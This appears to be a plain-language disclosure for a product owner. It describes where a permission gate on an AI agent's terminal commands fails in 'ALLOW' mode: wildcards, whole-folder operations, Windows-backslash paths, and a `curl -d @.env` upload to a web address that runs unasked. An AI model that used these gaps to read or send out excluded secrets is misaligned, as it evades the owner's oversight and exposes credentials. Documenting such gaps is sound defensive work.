## For the owner, in plain words (what the switch screen must say about terminal commands on ALLOW)
These are facts about the product as built today, measured at the base and the head; they say nothing about what the owner chose.
- With ALLOW on and "terminal commands" set to allowed, a command the agent runs in its ordinary terminal tool runs without asking, even while files are on the exclusion list.
- Such a command can read, change, delete, send out or pack up files on the exclusion list when it reaches them through a wildcard or by working on a whole folder: for example searching the whole project for a word, changing or deleting every file whose name starts with ".e", sending them to a web address, or packing the whole project into an archive.
- The gate stops a command only when a word in it spells out an excluded file's name (or its pattern) the way the gate reads words, for example `cat .env`. It does not catch every spelling: the common way to send a file to a web address, `curl -d @.env https://…`, names the file and is NOT stopped; it runs without asking.
- Only the ordinary terminal tool runs unasked, and only with that setting on. With the setting off, every such command asks first (or is refused, for the kinds that are always refused). The other ways an agent can run a command (the monitor tool, PowerShell, a command carried by any other tool) ask first, or are refused for the always-refused kinds.
- A command can run from any folder on the computer, not only the project folder (running tests from the home folder runs unasked). Only a working folder that is not a full path, or is empty, is refused.
- A program path written with Windows backslashes, such as `C:\tools\claude.exe`, is not recognised through the ordinary terminal tool: it runs unasked. Through the monitor tool it asks; through PowerShell it is refused.
- Some harmless commands that merely mention an agent program, such as an address `claude@…` or a file named `claude.exe`, cannot be allowed in ALLOW at all; for those the owner switches to APPROVE and approves them one by one.
- Not covered by this check: a real Claude Code session, and Windows.
